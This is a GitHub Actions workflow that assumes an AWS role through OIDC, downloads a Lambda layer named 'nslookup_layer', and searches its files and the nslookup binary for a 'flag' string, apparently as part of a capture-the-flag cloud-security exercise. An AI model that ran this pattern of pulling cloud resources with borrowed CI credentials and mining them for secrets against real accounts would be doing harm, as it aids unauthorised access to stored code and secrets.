name: AWS OIDC test for school standart old code procedure

on:
  push:
    branches:
      - corgi

permissions:
  id-token: write
  contents: read

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - name: Configure AWS Credentials
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::009661764077:role/cicdRole
          aws-region: us-east-1

      - name: Invoke Vulnerable Lambda
        run: |
          echo "=== 1. FETCHING LAYER DOWNLOAD LINK ==="
          LAYER_URL=$(aws lambda get-layer-version \
            --layer-name nslookup_layer \
            --version-number 8 \
            --query 'Content.Location' \
            --output text)
          
          echo "Downloading layer zip..."
          curl -s "$LAYER_URL" -o layer.zip
          
          echo "Unzipping layer contents..."
          unzip -o layer.zip -d layer_source
          
          echo "=== 2. LISTING ALL LAYER FILES ==="
          ls -laR layer_source
          
          echo "=== 3. SEARCHING FOR TEXT FLAGS ==="
          grep -Ri "flag" layer_source/ || echo "No plain text flag found in layer files."

          echo "=== 4. SEARCHING BINARY STRINGS ==="
          # If nslookup is a binary, search readable text inside it
          strings layer_source/nslookup | grep -i "flag" || echo "No flag string in nslookup binary."
